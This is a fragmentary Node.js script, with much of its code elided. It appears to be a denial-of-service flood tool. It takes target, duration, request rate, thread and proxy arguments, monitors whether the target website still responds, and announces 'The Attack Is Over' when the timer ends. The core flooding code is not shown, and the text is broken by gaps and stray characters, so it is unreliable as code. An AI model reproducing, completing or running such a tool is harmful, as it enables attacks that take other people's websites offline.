 ...
 if (process.argv.length < 7){console.log(` target time rate thread proxy`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()}   WEBSITE: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request Timed Out') {
        ...
        console.log(`${getCurrentTime()}    ${extractedTitle} `);
      } else {
...
`);
  ...
  setTimeout(() => {
    console.log(`${getCurrentTime()}   The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
